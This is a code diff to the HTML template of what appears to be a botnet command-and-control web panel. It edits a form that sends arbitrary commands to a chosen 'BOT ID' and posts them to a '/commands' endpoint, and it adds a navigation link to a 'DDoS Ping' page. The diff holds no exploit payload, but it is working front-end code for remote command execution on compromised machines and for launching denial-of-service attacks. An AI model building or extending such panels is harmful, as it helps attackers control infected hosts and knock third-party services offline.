@@ -70,11 +70,11 @@
         .sendcommands label {
             margin-top: 5px;
             margin-bottom: 5px;
-            font-weight: bold;
+            font-size: 28px;
             color: #ffffff;
         }
         .sendcommands input[type="text"] {
-            width: auto;
+            width: 350px;
             padding: 8px;
             margin: 0 5px;
             border: 1px solid #ccc;
@@ -108,9 +108,9 @@
         <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='img/dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
         <a href="{{ url_for('modules') }}"><img src="{{ url_for('static', filename='img/modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
         <a class="active" href="#commands"><img src="{{ url_for('static', filename='img/commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
+        <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='img/danger_icon.png') }}" alt="DDoS Ping Icon" class="avatar"> DDoS Ping</a>
         <a href="{{ url_for('logout') }}"><img src="{{ url_for('static', filename='img/logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
     </div>
-    <h1>COMMAND EXECUTION FORM</h1>
     <div class="content">
         <form id="commandForm" class="sendcommands">
             <label for="botId">BOT ID:</label>
@@ -126,19 +126,17 @@
             event.preventDefault();
             var botId = document.getElementById('botId').value;
             var command = document.getElementById('command').value;
-            var modifiedCommand = "shell " + command;
-            executeCommand(botId, modifiedCommand);
+            executeCommand(botId, command);
         });
-    
         function executeCommand(botId, command) {
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/execute_command', true);
+            xhr.open('POST', '/commands', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
                     if (xhr.status === 200) {
                         var response = JSON.parse(xhr.responseText);
-                        document.getElementById('output').innerText = response.result;
+                        document.getElementById('output').innerText = formatOutput(response.output);
                     } else {
                         document.getElementById('output').innerText = 'Error: ' + xhr.responseText;
                     }
@@ -147,7 +145,14 @@
             var data = JSON.stringify({ botId: botId, command: command });
             xhr.send(data);
         }
-    </script>
-    
+        function formatOutput(output) {
+            try {
+                let jsonData = JSON.parse(output);
+                return JSON.stringify(jsonData, null, 4);
+            } catch (error) {
+                return output;
+            }
+        }
+    </script>       
 </body>
 </html>
